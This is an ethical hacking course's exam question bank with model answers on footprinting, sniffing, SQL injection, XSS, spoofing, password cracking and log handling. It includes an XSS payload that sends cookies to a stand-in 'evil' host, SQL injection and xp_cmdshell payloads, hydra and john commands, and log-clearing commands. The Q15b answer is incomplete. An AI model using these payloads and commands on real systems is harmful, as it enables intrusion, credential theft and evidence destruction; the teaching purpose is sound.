Preamble & prerequisite

The course enables students to learn ethical hacking and security challenges in computer networking. It addresses data security issues, types of attacks including malwares, viruses, sniffers and denial of service. Students also learn how to protect the network system using firewalls and filters, together with the legal, professional and ethical issues involved.

Prerequisite: Knowledge in Cryptography, System and Network Security, and Computer Networks.

PART A — Answer all questions. Each question carries 3 marks (10 × 3 = 30)

Q1

Stages of hacking

3 marks

What are the different stages involved in hacking?

Answer

Definition. Hacking in the ethical context is the authorised, structured process of discovering and exploiting weaknesses in a target system to prove a security failure exists. The industry standard is the five-phase CEH methodology: Reconnaissance, Scanning, Gaining Access, Maintaining Access and Covering Tracks.

Mechanism (the five stages).

  1. Reconnaissance (foot printing): passive or active information gathering — whois, DNS, search engines, social media, job posts.
  2. Scanning: find live hosts, open ports, services, OS and known vulnerabilities with ping sweeps, nmap and vulnerability scanners.
  3. Gaining access: exploit a discovered flaw (weak authentication, SQL injection, unpatched service, stolen credentials) to enter the system.
  4. Maintaining access: install backdoors, rootkits or rogue accounts so the entry can be reused; escalate privileges.
  5. Covering tracks: clear or alter logs, hide files and erase artifacts to avoid detection.

Example. An auditor footprints example.com, scans and finds an unpatched SMTP service, gains a shell, adds a hidden admin account, then removes the relevant /var/log entries — demonstrating each phase.

Exam tip: Draw the 5-phase chain and name one tool per phase; examiners award marks for the sequence and for separating active from passive reconnaissance.

Pitfall: Do not present hacking as a single "run an exploit" step — the pre-attack information gathering is worth marks.

Q2

Elements of information security

3 marks

Define the basic elements of information security.

Answer

Definition. Information security protects the confidentiality, integrity and availability of data and the systems that hold it. The basic elements are the CIA triad plus authenticity, non-repudiation, accountability and access control.

Mechanism.

  • Confidentiality: only authorised parties read the data — encryption (AES, RSA), access control lists and authentication.
  • Integrity: data is not altered without authorisation — hashing (SHA-256), digital signatures and version control.
  • Availability: systems and data are ready when needed — redundancy, backups, RAID, failover, DoS protection.
  • Authenticity: proof that a user, message or source is genuine — passwords, certificates, biometrics, PKI.
  • Non-repudiation: the sender cannot deny an action — digital signatures, audit logs, timestamps.

Example. An online transfer is encrypted in transit (confidentiality), carries a hash/signature (integrity + authenticity + non- repudiation), and the bank keeps the service up with redundant servers (availability).

Security = C + I + A, supported by authenticity and non-repudiation.

Exam tip: Give one concrete technology for each element — bare definitions of CIA usually earn only half the marks.

Q3

Foot printing

3 marks

What is foot printing? How is it done?

Answer

Definition. Foot printing is the first reconnaissance phase: the systematic collection of as much information as possible about a target network, system, organisation and its people, before any attack is launched. It converts an unknown target into a mapped one.

How it is done (method).

  1. Passive: collect without touching the target — whois, DNS records, search engines, Google hacking (site:, filetype:), social media, job advertisements, archived pages.
  2. Active: interact with the target — ping, traceroute, port scans, banner grabbing, DNS zone transfers, SMTP enumeration.
  3. Organise: correlate IPs, domains, subnets, emails, employee names and technologies into a target profile.
  4. Analyse: identify likely vulnerabilities and entry points from the collected data.

Example. whois example.com reveals the registrar and admin email; a Google query site:example.com filetype:pdf exposes internal documents; nslookup -type=AXFR may dump the whole zone.

Exam tip: Always contrast passive (no packets sent to target, undetectable) with active (detectable, logged) foot printing.

Q4

DoS vs DDoS

3 marks

How Distributed DoS is different from DoS?

Answer

Definition. Denial of Service (DoS) is an attempt to make a legitimate resource unavailable by overwhelming it with traffic or exhausting its resources. Distributed DoS (DDoS) is the same goal achieved from many compromised machines (a botnet) acting at once.

BasisDoSDDoS
SourceSingle machine / IPMany distributed machines (botnet)
Traffic volumeLimited by one hostVery large, aggregated
TraceabilityEasier to block / traceHard — spoofed, thousands of IPs
ImpactLocalised, shorterSevere, can saturate the link
ExamplePing flood, SYN flood from one PCBotnet SYN/UDP flood, amplification
DefenceACL, rate limiting, firewallAnycast, scrubbing, IPS, rate limits, CDN

Example. A single host sending SYN packets fills one server's backlog (DoS); a botnet of 10,000 zombies saturates the ISP link (DDoS), so blocking one IP does not help.

Exam tip: The keyword is "distributed" — many sources, amplification and botnets. Mention that DDoS mitigation needs upstream filtering because the link itself is exhausted.

Q5

Network sniffing

3 marks

Explain network sniffing.

Answer

Definition. Network sniffing (packet capture) is the process of capturing and inspecting every packet traversing a network segment, using a packet analyser in promiscuous mode. Legitimate use: troubleshooting and intrusion analysis; malicious use: stealing credentials sent in clear text.

Mechanism. A NIC normally accepts only frames addressed to it. In promiscuous mode it accepts all frames on the collision domain. A capture tool (Wireshark, tcpdump, Ettercap) hooks the driver, buffers frames and decodes protocols layer by layer. On switched networks the attacker must first defeat the switch — via ARP spoofing, MAC flooding or a SPAN/mirror port — to see others' traffic.

Example. Running tcpdump -i eth0 port 23 on a hub or a mirrored port reveals Telnet usernames and passwords in plain text; capturing HTTP shows session cookies that can be replayed.

Countermeasure: encryption (HTTPS, SSH, VPN), switch port security, dynamic ARP inspection, and IDS alerts on promiscuous NICs.

Exam tip: Mention promiscuous mode and the switched-network problem (ARP poisoning / SPAN port) — that is what distinguishes a full-credit answer.

Q6

Brute-force attack

3 marks

How is Brute-force attack performed?

Answer

Definition. A brute-force attack tries every possible credential combination until the correct one is found. It is exhaustive and unintelligent in principle, but dictionary and rule-based variants make it practical by trying likely passwords first.

Mechanism / steps.

  1. Identify the target service — SSH, RDP, FTP, HTTP login form, or a password hash file.
  2. Build a wordlist (rockyou.txt, common passwords) and add mutation rules (leetspeak, appended digits).
  3. Automate attempts with a tool: hydra -l admin -P pass.txt target ssh, John the Ripper or Hashcat for offline hashes.
  4. Observe responses — successful login, changed hash, or "account locked" message — and record the match.

Example. Hydra tests FTP logins at 50 threads; John cracks a stolen SHA-1 hash offline at millions of guesses per second.

Search space ≈ N^L for alphabet size N and length L — why long, complex passwords resist brute force.

Pitfall: Forgetting account lockout, CAPTCHA and rate limiting; a good answer always states both the attack steps and the defences (strong passwords, salts, lockout, MFA).

Exam tip: Distinguish online (rate-limited) from offline (hash-based, unlimited speed) brute force.

Q7

SQL injection

3 marks

What is SQL injection? How can you find whether the website is affected by SQL injection?

Answer

Definition. SQL injection (SQLi) is a vulnerability in which untrusted user input is concatenated into an SQL query, so the input is executed as code. It can bypass authentication, dump databases or destroy data.

Mechanism. A vulnerable backend builds SELECT * FROM users WHERE name='"+user+"'. Supplying ' OR '1'='1 closes the string and makes the WHERE clause always true, logging the attacker in without a password.

Detection (finding it).

  1. Test every input (forms, URL parameters, cookies, headers) with ', ", ;-- and observe SQL errors.
  2. Use boolean pairs: ' OR 1=1-- vs ' AND 1=0-- — a different response indicates injection.
  3. Use time-based payloads e.g. SLEEP(5) / WAITFOR DELAY '0:0:5' and measure the delay.
  4. Confirm with UNION enumeration, ORDER BY to find column count, and tools such as sqlmap.

Prevention: parameterised queries / prepared statements, stored procedures, input validation, least-privileged DB accounts, WAF.

Exam tip: Show one payload AND name the fix (prepared statements) — examiners look for both detection and remediation.

Q8

Cross-site scripting

3 marks

What is cross-site scripting and what are its different variations?

Answer

Definition. Cross-site scripting (XSS) injects malicious JavaScript into a web page that is then executed in another user's browser, allowing cookie theft, session hijacking, keylogging or defacement.

Variations.

  • Reflected (non-persistent): the payload is in the request (e.g. a search query) and is echoed immediately in the response. Needs the victim to click a crafted link.
  • Stored (persistent): the payload is saved on the server (comment, forum post, profile) and executes for every visitor — the most dangerous form.
  • DOM-based: the flaw is in client-side JavaScript that writes URL data into the DOM (document.write, innerHTML); the payload never reaches the server.

Example. A comment containing <script>document.location='http://evil/?c='+document.cookie</script> stored in a guestbook steals every reader's session cookie.

Prevention: context-aware output encoding, input validation, Content Security Policy, HttpOnly cookies, framework auto-escaping.

Exam tip: Name all three types with one example each; state that XSS is a client-side injection while SQLi targets the database.

Q9

Password cracking challenges

3 marks

List out the challenges in password cracking.

Answer

Definition. Password cracking is recovering a password from a stored hash or a login service, usually with dictionaries, rules and brute force. The "challenges" are the factors that slow or prevent it.

Key challenges.

  1. Salting: a unique random salt per password makes precomputed rainbow tables useless and prevents identical hashes revealing identical passwords.
  2. Slow, memory-hard hashes: bcrypt, scrypt, Argon2 and PBKDF2 deliberately cost time/memory, cutting guess rates dramatically.
  3. Password length and complexity: entropy grows exponentially — N^L — so long passphrases are infeasible to brute force.
  4. Account lockout / rate limiting / CAPTCHA: throttle online guessing and can lock the account.
  5. Multi-factor authentication: even a correct password is insufficient without the second factor.
  6. Unknown hash format / encryption and legal constraints: identifying the algorithm and having authorised access matter.

Example. An unsalted MD5 hash falls in seconds with a rainbow table; a bcrypt hash with cost 12 may take days per password.

Exam tip: Lead with salting and slow hashes; then mention lockout, length and MFA. Link each challenge to the countermeasure it provides.

Q10

Event logging

3 marks

Define Event logging.

Answer

Definition. Event logging is the automatic recording of significant system and application events — logins, file access, process starts, configuration changes, errors — into a chronological, tamper-evident record (the event log / audit trail).

Mechanism. The OS or application emits events with a timestamp, source, event ID and description. On Windows they go to the Event Log (Application, Security, System); on Linux to /var/log via syslog/rsyslog/journald. Logs support detection, incident response, accountability and non-repudiation, and are a core safeguard under CO5.

Example. Event ID 4624 records a successful logon and 4625 a failed one; a burst of 4625s followed by a 4624 suggests a brute-force attack that succeeded.

Audit trail = who + what + when + where + outcome.

Pitfall: Attackers "cover tracks" by clearing or altering these logs, so defenders must forward logs to a central, write-once SIEM and protect them with file permissions.

Exam tip: Tie logging to non-repudiation and incident handling, and mention centralised, protected log storage as the defence against log tampering.

Q11a

Q11(a) — Security challenges

14 marks

Write down the security challenges in information security. (6 marks)

Answer

Definition. Security challenges are the evolving threats and constraints that make protecting confidentiality, integrity and availability difficult. They arise from technology, people and process.

The principal challenges.

  1. Growing attack surface: cloud, IoT, BYOD, mobile and remote work multiply endpoints and entrances.
  2. Advanced persistent threats & zero-days: well-funded attackers use unknown vulnerabilities that signature tools cannot detect.
  3. Malware, ransomware & exploits: viruses, worms, Trojans, backdoors and rootkits evolve faster than signatures.
  4. Insider threats & social engineering: humans are the weakest link — phishing, pretexting, shoulder surfing, dumpster diving bypass technical controls.
  5. Weak authentication & credential theft: reused, weak or stolen passwords; credential stuffing and brute force.
  6. Web application flaws: SQL injection and XSS in poorly coded applications expose data.
  7. Data loss / denial of service: theft of intellectual property and DoS/DDoS affecting availability.
  8. Compliance, privacy & budget: legal requirements (GDPR, IT Act) and shortage of skilled staff constrain defences.

Example. A hospital faces ransomware (malware), phishing of staff (social engineering), unpatched legacy scanners (zero-day risk) and strict patient-data privacy rules simultaneously.

Exam tip (6 marks): List at least six challenges with a one-line explanation each; group them as technical, human and organisational for full credit.

Q11b

Q11(b) — Types of penetration testing

14 marks

Describe the different types of penetration testing. (8 marks)

Answer

Definition. Penetration testing is an authorised, controlled simulation of an attack used to find exploitable weaknesses before criminals do. Tests are classified by knowledge, scope, approach and frequency.

By knowledge (the classic three).

TypeTester knowledgePurpose
Black-boxNothing about the targetSimulates a real external attacker; tests detection and response
White-boxFull access to code, diagrams, credentialsDeep, thorough code/config review
Grey-boxPartial knowledge (e.g. user credentials)Balanced test of an insider or leaked-account scenario

Other categories.

  • By scope: network, web application, wireless, mobile, social engineering, physical, cloud and red-team exercises.
  • By approach: manual (human reasoning, chaining flaws) vs automated (scanners such as Nessus, OpenVAS, OWASP ZAP).
  • By announcement: covert (target unaware — tests the SOC) vs overt (management aware).
  • By position: external (Internet-facing) vs internal (assume a compromised insider).

Example. A grey-box web test: the client supplies a low- privilege account; the tester uses Burp Suite to find SQLi and escalates to admin, proving impact.

Exam tip (8 marks): Define each type, give one scenario per type, and mention methodology standards OSSTMM, NIST SP 800-115 and OWASP from Module 1.

Q12a

Q12(a) — Role of a penetration tester

14 marks

Explain the role of a penetration tester in ethical hacking. (8 marks)

Answer

Definition. A penetration tester (ethical hacker or "white hat") is an authorised security professional who legally attacks a system to discover weaknesses, then reports and helps remediate them. The role converts "we think we are secure" into evidence.

Roles and responsibilities.

  1. Define scope & obtain written authorisation: a signed rules-of-engagement document stating targets, times, methods and emergency contacts — this is what makes the hacking ethical and legal.
  2. Reconnaissance & scanning: gather intelligence, map the attack surface and enumerate hosts, ports and services.
  3. Vulnerability analysis: identify and prioritise weaknesses with scanners and manual verification.
  4. Exploitation: safely prove impact — gain limited access, escalate privileges, pivot — without damaging data or availability.
  5. Post-exploitation & reporting: document every step, produce an executive summary plus technical findings with severity ratings and remediation advice.
  6. Retesting: verify that fixes actually work.
  7. Ethical & legal conduct: maintain confidentiality, respect privacy, avoid data destruction, and follow the law (IT Act, GDPR).

Example. Before a bank's annual audit, the tester signs the RoE, runs Nessus, confirms an unpatched IIS flaw, obtains a shell, then delivers a report ranking the flaw "critical" with the patch as remediation.

The role is inevitable today because compliance (PCI-DSS, ISO 27001) mandates regular testing and breaches are costly.

Exam tip (8 marks): Stress authorisation, scope, minimal impact and reporting — these separate a professional pen tester from a malicious hacker.

Q12b

Q12(b) — Vulnerability assessment

14 marks

Describe how vulnerability assessment is done. (6 marks)

Answer

Definition. Vulnerability assessment (VA) is the systematic, automated discovery, classification and prioritisation of security weaknesses in systems and applications — it identifies flaws but does not necessarily exploit them.

Procedure.

  1. Define scope and asset inventory: list hosts, networks and applications to be assessed.
  2. Discovery: use ping sweeps and port scanners (Nmap) to find live systems, open ports and running services.
  3. Fingerprinting: determine OS and service versions/banners.
  4. Vulnerability scanning: run Nessus, OpenVAS, Qualys or Nikto, which compare findings against databases such as CVE, NVD, OVAL and Exploit-DB.
  5. Analysis & validation: remove false positives, assign severity (CVSS score), and map findings to risk.
  6. Reporting & remediation: produce a ranked report with patch/ mitigation advice, then rescan to confirm closure.

Example. Nessus reports an outdated Apache version (CVE with CVSS 9.8) on one host; the team patches it and a rescan shows the finding closed.

Risk = Threat × Vulnerability × Impact — why a critical CVE on an internal test box may rank lower than a medium one on the payment server.

Exam tip (6 marks): Give the steps in order and explicitly contrast VA (discover + rank) with penetration testing (prove exploitability). Name at least one scanner and one vulnerability database.

Q13a

Q13(a) — Dumpster diving

14 marks

Explain any one method to showcase dumpster diving social engineering attack. (8 marks)

Answer

Definition. Dumpster diving is a physical social- engineering attack in which an attacker retrieves sensitive information from discarded material — paper documents, media, hardware — that the organisation failed to destroy securely.

Method — a staged demonstration.

  1. Target selection & observation: identify the organisation's waste bins and collection schedule; note when cleaning staff take refuse to an external dumpster.
  2. Pretext / entry: dress as a cleaner or contracted waste worker, or simply collect from an unsecured kerbside bin — no forced entry is needed.
  3. Collection: remove bags of paper, old hardware, CDs, USB drives and take them off-site for analysis.
  4. Information extraction: sift for bank statements, customer records, printed emails, employee lists, phone books, usernames, passwords written on notes, and configuration printouts.
  5. Exploitation: use the recovered names and internal details to craft a convincing phishing/pretext call, or reuse discovered credentials to log in remotely.
  6. Document & report: log each item found and show how it could be leveraged — this demonstrates the business risk.

Example. A printed server inventory with internal IPs and an old employee's login note is recovered; the attacker calls the help desk pretending to be that employee and resets the password.

Countermeasures: shred all paper (cross-cut), wipe/destroy disks and media, lock dumpsters on site, security awareness training, and a clear document-destruction policy.

Exam tip (8 marks): Present the attack as a numbered procedure and always append defences — examiners reward the "attack + mitigation" pairing.

Q13b

Q13(b) — Results of foot printing tools

14 marks

What are the results obtained by the usage of foot printing tools? (6 marks)

Answer

Definition. Foot printing tools gather and correlate public and semi-public information about a target. Their output is the raw material for the later attack phases.

Typical results.

Tool / techniqueResult obtained
whoisRegistrant, registrar, admin contact, name servers, creation/expiry dates
nslookup / dig / zone transferIP addresses, mail servers (MX), subdomains, full DNS zone if misconfigured
Google hacking / search enginesExposed files, PDFs, directory listings, emails, job posts revealing technology
theHarvester / MaltegoEmployee emails, names, social profiles, hosts and domains
ping / tracerouteLive hosts, network path, router hops, approximate topology
Netcraft / builtwithWeb server OS, hosting provider, frameworks and technologies in use

How the results are used. The tester builds a target profile: IP ranges and subdomains to scan, employee names for phishing/social engineering, and software versions to match against exploit databases. For example, discovering an old Apache version via a banner narrows the later scan to known Apache CVEs.

Pitfall: Foot printing is not "hacking" by itself — it is information gathering. Distinguish passive results (no contact with target) from active results (may be logged).

Exam tip (6 marks): Give a tool-to-result table and state how the information feeds the next phase (scanning and enumeration).

Q14a

Q14(a) — Social enumeration

14 marks

Explain how social enumeration is performed. (6 marks)

Answer

Definition. Social enumeration is the systematic collection of information about people — employees, partners, customers — and their relationships, roles and habits, to support social engineering or credential attacks. It is the human counterpart of network enumeration.

How it is performed.

  1. Identify the organisation's people: harvest names and email addresses from the company site, whois records, press releases and search engines (theHarvester, Maltego).
  2. Mine social networks: LinkedIn, Facebook, Twitter/X reveal job titles, reporting structure, projects, locations and interests.
  3. Build an org chart: infer hierarchy, departments and reporting lines; note new hires and people on leave (from auto-replies).
  4. Profile technical clues: technical staff posting about firewalls, migrations or software versions disclose the technology stack.
  5. Craft pretexts: use the gathered detail to impersonate IT, HR or a vendor in a phishing call or email that passes verification questions.
  6. Document findings: record each identity and how it could be abused, for the engagement report.

Example. A LinkedIn post announcing a new "Cisco ASA migration" plus an employee named in the IT team lets the attacker call the help desk as that person and request a VPN reset.

Defence: social-media privacy training, awareness programmes, verification callbacks and least-privilege access.

Exam tip (6 marks): Emphasise that enumeration is systematic (not random browsing) and that its output directly enables pretexting and phishing.

Q14b

Q14(b) — Working of network sniffers

14 marks

Illustrate the working of network sniffers. (8 marks)

Answer

Definition. A network sniffer (protocol analyser) captures and decodes packets passing through a network segment. Examples: Wireshark, tcpdump, Ettercap, Cain and Abel.

Working — step by step.

  1. NIC in promiscuous mode: the interface is told to accept all frames, not just those addressed to its MAC.
  2. Capture driver: libpcap/WinPcap copies frames from the driver buffer to user space before the stack discards them.
  3. Filtering: a capture filter (BPF), e.g. tcp port 80, limits what is stored.
  4. Decoding: the analyser parses each layer — Ethernet → IP → TCP/UDP → application — and reassembles streams.
  5. Analysis / display: protocol hierarchy, follow-stream, statistics and string search reveal credentials and data.
  Normal NIC:   accepts only frames with MY MAC
  Promiscuous:  accepts ALL frames on the segment
                +---------------------------+
  App A ------->|  switch / hub (or SPAN)   |------> App B
                +-------------+-------------+
                              | mirrored traffic
                              v
                     [ Sniffer: libpcap ]
                     Ethernet | IP | TCP | HTTP
                     -> decoded, searchable packets

Switched network issue. A switch sends frames only to the destination port, so the attacker uses ARP spoofing, MAC flooding or a SPAN/mirror port to obtain others' traffic.

Example: capturing Telnet (port 23) shows USER admin and PASS secret in clear text.

Exam tip (8 marks): Include the diagram, name promiscuous mode and libpcap, explain the switched-network workaround, and give encryption/ARP inspection as countermeasures.

Q15a

Q15(a) — DNS manipulation via ARP spoofing

14 marks

How DNS records can be manipulated using ARP spoofing? (6 marks)

Answer

Definition. ARP spoofing (ARP poisoning) sends forged ARP reply messages that associate the attacker's MAC address with another host's IP — typically the gateway. Once traffic is diverted through the attacker, DNS answers can be forged (DNS spoofing/poisoning) to redirect victims to malicious sites.

Step-by-step mechanism.

  1. The attacker learns the gateway IP (e.g. 192.168.1.1) and victim IP.
  2. Using a tool (Ettercap, arpspoof, Cain), the attacker sends gratuitous ARP replies: "192.168.1.1 is at attacker's MAC" and "victim is at attacker's MAC".
  3. Victim's ARP cache is poisoned; its traffic now goes to the attacker, who forwards it to the real gateway to avoid suspicion (MITM).
  4. The attacker runs a fake DNS responder and sniffs DNS queries. When the victim asks for www.bank.com, the attacker returns a forged A record pointing to a fake IP before the real DNS reply arrives.
  5. The victim's DNS cache stores the fake mapping and connects to the attacker's server, which can harvest credentials.
 victim --(forged ARP: GW=attackMAC)--> attacker --> real gateway
 victim DNS query "bank.com" --> attacker --> forged "A bank.com = 10.0.0.66"
 victim browser --> fake bank.com (phishing page)

Countermeasures: Dynamic ARP Inspection (DAI), DHCP snooping, static ARP entries, DNSSEC, encrypted DNS (DoH/DoT), HTTPS and IDSC alerting on ARP changes.

Exam tip (6 marks): Show both the ARP poisoning step and the forged DNS A record; name DAI and DNSSEC as defences.

Q15b

Q15(b) — Network sniffing and its types

14 marks

Explain network sniffing and its different types? (8 marks)

Answer

Definition. Network sniffing is capturing packets on a network segment for analysis. Based on how traffic is obtained and what is examined, sniffing is classified as follows.

TypeHow it worksNotes
Passive sniffingListen on a hub or SPAN/mirror port; no packets injectedUndetectable, works on shared/hub networks

Mechanism recap. The sniffer places the NIC in promiscuous mode, captures via libpcap, applies a BPF filter and decodes each protocol layer, reassembling streams for reading.

Example. On a switch, arpspoof -t victim gateway plus Wireshark lets an attacker read the victim's HTTP cookies; passive capture on a SPAN port achieves the same without poisoning.

Q16a

Q16(a) — DHCP spoofing

14 marks

Describe DHCP Spoofing. (6 marks)

Answer

Definition. DHCP spoofing is an attack in which a rogue DHCP server responds to clients before the legitimate one, handing out malicious network configuration — above all, the attacker's machine as the default gateway and DNS server.

Mechanism / steps.

  1. A client broadcasts DHCPDISCOVER to obtain an IP address.
  2. The attacker's rogue DHCP server races the real server and replies with DHCPOFFER containing a valid-looking IP, subnet and DNS — but a malicious gateway (the attacker's IP).
  3. The client accepts the offer (usually the first reply wins) and configures its routing table through the attacker.
  4. All traffic leaving the victim now passes through the attacker, enabling sniffing, MITM, DNS spoofing and credential theft.
  5. The attacker forwards packets to the real gateway so the victim sees no interruption.
 client --DHCPDISCOVER--> * (broadcast)
        <--DHCPOFFER(gateway=attacker)-- rogue DHCP  [wins race]
        <--DHCPOFFER(gateway=real)----- real DHCP
 client traffic --> attacker --> real gateway  (MITM)

Example. Tools such as Yersinia or DHCPig set up a rogue server; a victim then resolves www.mail.com through the attacker's DNS to a phishing clone.

Countermeasures: DHCP snooping on switches (trust only legitimate server ports), DAI, 802.1X, port security, and monitoring for unexpected DHCPOFFERs.

Exam tip (6 marks): Describe the DORA race, stress "rogue gateway = MITM", and name DHCP snooping as the primary defence.

Q16b

Q16(b) — Attacking SQL servers

14 marks

How SQL Servers are vulnerable attacked? (8 marks)

Answer

Definition. SQL servers are attacked when applications pass untrusted input into queries, or when the database itself is exposed with weak credentials or default settings. The result is unauthorised data access, modification or destruction.

Attack vectors and procedure.

  1. Discovery: scan for port 1433 (MSSQL) / 3306 (MySQL) and fingerprint the version with Nmap or a banner grab.
  2. Weak authentication: guess default/typed credentials (sa/blank, root/root) with Hydra or sqlmap; test for empty passwords and leaked accounts.
  3. SQL injection: submit ' OR 1=1-- in a login form to bypass authentication; use ORDER BY and UNION SELECT to enumerate tables and dump data.
  4. Blind / time-based injection: when errors are hidden, use boolean or SLEEP()/WAITFOR DELAY payloads to extract data bit by bit.
  5. Privilege escalation & command execution: enable xp_cmdshell or use stacked queries to run OS commands and plant a backdoor.
  6. Automate: confirm and exploit with sqlmap (sqlmap -u "http://site/id=1" --dbs).

Example. An unpatched MSSQL with sa password "admin" is found on port 1433; the attacker logs in, enables xp_cmdshell and adds a Windows user for persistent access.

Countermeasures: parameterised queries / stored procedures, least-privileged DB accounts, disable xp_cmdshell, strong passwords, patching, firewall rules (never expose the DB directly) and a WAF.

Exam tip (8 marks): Cover discovery, weak credentials, SQLi variants and escalation, then give defences — name one tool and one payload.

Q17b

Q17(b) — Reverse engineering

14 marks

Explain how Reverse Engineering is done. (6 marks)

Answer

Definition. Reverse engineering is the process of analysing a compiled program, binary or malware to discover its structure, logic and behaviour without the original source code. In ethical hacking it is used to understand malicious code and find vulnerabilities.

Procedure.

  1. Static analysis (without running): inspect file type and headers with file and PE/ELF tools; extract strings with strings; view imports, sections and packers with PE Explorer or objdump.
  2. Disassembly: convert machine code to assembly with IDA Pro, Ghidra, radare2 or objdump; identify functions, loops, API calls and constants.
  3. Decompilation: produce pseudo-code (Ghidra, Hex-Rays, dnSpy for .NET, CFR for Java) to recover high-level logic.
  4. Dynamic analysis (in a sandbox): run in an isolated VM and observe with a debugger (OllyDbg, x64dbg, gdb), process monitor (ProcMon) and a network sniffer; record file, registry and network activity.
  5. Interpret & document: reconstruct the algorithm or behaviour, identify indicators of compromise and write the analysis report.

Example. A packed Trojan is unpacked in a sandbox, strings reveal a C2 domain, and disassembly shows a keylogger hook — yielding IOCs for the IDS.

Pitfall: Never run unknown malware on a production machine; always use an isolated, disposable VM with no shared folders.

Exam tip (6 marks): Contrast static and dynamic analysis and name one tool from each category.

Q18b

Q18(b) — Incident handling & response

14 marks

Explain the concept of Incident Handling & Response. (8 marks)

Answer

Definition. Incident handling and response (IH&R) is the organised process of detecting, assessing, containing, eradicating and recovering from a security incident, followed by lessons learned. Its goal is to limit damage and restore normal operations.

The six-step process (numbered procedure).

  1. Preparation: build an incident response team (CSIRT), policies, playbooks, tooling (SIEM, forensics kits) and contact lists — before an incident happens.
  2. Detection & analysis: collect alerts from IDS, logs and users; determine whether an incident occurred, its scope and severity; assign a case number and preserve evidence.
  3. Containment: stop the spread — isolate affected hosts from the network, disable compromised accounts, block malicious IPs — while preserving volatile data for forensics.
  4. Eradication: remove the root cause — delete malware, patch the vulnerability, rebuild systems from trusted media and rotate credentials.
  5. Recovery: restore systems from clean backups, validate with scans and monitoring, and return to production gradually.
  6. Lessons learned: hold a post-incident review, document the timeline and impact, and update defences and playbooks.
Prepare → Detect/Analyse → Contain → Eradicate → Recover → Lessons Learned
          (log / SIEM evidence flows through every stage)

Example. Ransomware on one host: the SOC detects it via mass file-renaming alerts, isolates the host, wipes and rebuilds it, restores files from offline backups, then enforces MFA after review.

Key point: logging and evidence preservation (link to Module 5) are essential at every stage.

Exam tip (8 marks): List all six phases in order with one action each; include evidence handling and the post-incident review.

Q19a

Q19(a) — Hiding evidence by altering event logs

14 marks

How can we hide evidence by altering event logs? (6 marks)

Answer

Definition. Attackers "cover their tracks" by modifying or destroying the event logs that would otherwise record their actions — a Module 5 technique that defeats detection and non-repudiation.

Common methods.

  1. Clearing the log: wipe the entire event log — Windows wevtutil cl Security or clearlog; Linux > /var/log/auth.log. Obvious to investigators because a gap appears.
  2. Deleting / selective editing: remove only specific events (an anomalous logon, a process start) so the log looks continuous and natural.
  3. Log tampering / forgery: edit raw log files or use tools (eventlogedit) to change timestamps, usernames or event IDs and plant a false trail.
  4. Stopping the logging service: disable syslog/rsyslog or the Windows Event Log service, perform the attack, then restart it.
  5. Redirecting / spoofing: send events to a fake collector, change log file permissions, or exploit the log service to crash it (log flooding / DoS).
  6. Deleting artifacts: remove shell history, temp files and timestamps (timestomp) that corroborate the log entries.

Example. After a privilege escalation the attacker clears Event ID 4672 (special privileges assigned) and rewrites the log file's modification time to blend in.

Defence: forward logs in real time to a central, write-once SIEM, restrict log file permissions, enable log integrity/signing, and alert on log-clear events (e.g. Windows 1102).

Exam tip (6 marks): Name at least four techniques and stress that centralised, tamper-evident logging is the key countermeasure.

Q19b

Q19(b) — Defenses against log and accounting file attacks

14 marks

What are the defense methods taken against log and accounting file attacks? (8 marks)

Answer

Definition. Log and accounting-file attacks are attempts to delete, alter or forge audit records to hide intrusions. Defences aim to make records complete, tamper-evident and available for investigation.

Defence methods.

  1. Centralised, remote logging: forward events immediately to a hardened log server / SIEM so a compromised host cannot edit copies it no longer holds.
  2. Write-once / append-only storage (WORM): use immutable storage so records cannot be changed or deleted after writing.
  3. Access control: restrict read/write rights on log files to the logging service only; remove write permission from general users and admins where possible.
  4. Integrity protection: hash or digitally sign log entries and verify them; use file-integrity monitoring (Tripwire, AIDE) to detect changes.
  5. Redundancy & time sync: keep redundant collectors and synchronise clocks with NTP so timestamps are trustworthy across systems.
  6. Monitoring & alerting: alert on log-clear events, service stops, gaps in sequence numbers and unusual file modifications.
  7. Encryption & secure transport: ship logs over TLS (syslog-ng/rsyslog TLS) to prevent interception and forgery in transit.
  8. Retention & policy: keep logs long enough for forensics and compliance, with protected backups.
 host --(TLS syslog)--> SIEM / WORM store  [append-only, hashed]
        attacker cannot rewrite the remote copy  |  alerts on gaps / 1102

Example. An attacker clears the local Security log, but the SIEM already received each event and raises an alert on Event 1102 (log cleared), preserving the evidence.

Exam tip (8 marks): Give at least six defences with a one-line rationale; emphasise centralisation, append-only storage, integrity checking and alerting on log clearance.

Q20a

Q20(a) — Password cracking for system hacking

14 marks

Explain how Password cracking method is used for system hacking? Explain any one tool used for cracking usernames and passwords. (8 marks)

Answer

Definition. Password cracking recovers or guesses a user's password to gain unauthorised access to a system. In system hacking it is used after enumeration to obtain the credentials needed for login, privilege escalation and persistence.

How it is used in system hacking (procedure).

  1. Enumerate accounts: obtain usernames via net user, LDAP queries, or enumeration tools.
  2. Obtain hashes / target a login: dump the SAM/NTDS database or /etc/shadow with Mimikatz or pwdump for offline cracking, or attack a live login service (SMB, RDP, SSH) online.
  3. Choose an attack: dictionary, rule-based, brute force, rainbow table (for unsalted hashes), or credential stuffing with leaked lists.
  4. Crack: run the cracker with wordlists and rules until plaintext passwords appear.
  5. Use the credentials: log in, escalate privileges (runas, sudo), and create a persistent backdoor account.

Tool — John the Ripper. An offline password cracker that auto-detects hash types (DES, MD5, NTLM, bcrypt). It accepts a hash file and a wordlist: john --wordlist=passwords.txt hashes.txt; rules mutate each word (capitalisation, appended digits, leetspeak), and john --show displays recovered passwords. Hashcat is a GPU-based alternative.

 dump hashes --> john --wordlist=rockyou.txt hashes.txt --> plaintext
             --> login --> escalate --> persistent account

Example / defences: A weak NTLM hash cracks in minutes; strong, salted, long passwords plus MFA, lockout and authorised, ethical use only defeat it.

Pitfall: Cracking is only lawful with written authorisation — stress the ethical/legal boundary in the answer.

Exam tip (8 marks): Give the hacking steps, explain one tool with a command, and add defences and the legal caveat.

Q20b

Q20(b) — Hiding evidence on the network

14 marks

Evidence on network can be hidden. Justify? (6 marks)

Answer

Definition. "Hiding evidence on the network" means an attacker concealing the traces of their activity from network-based detection — logs, flows and packets — so investigators cannot reconstruct the intrusion. The statement is justified because network evidence is fragile and can be manipulated in many ways.

How network evidence is hidden (justification).

  1. Encryption / tunnelling: VPNs, SSH tunnels and Tor hide payloads and destinations from sniffers, so packet inspection sees only ciphertext.
  2. Traffic fragmentation & timing: fragmenting packets or slow, low-and-slow rates defeat signature matching and rate-based detection.
  3. Spoofing: forged source IPs/MACs and proxy chains hide the true origin from flow records.
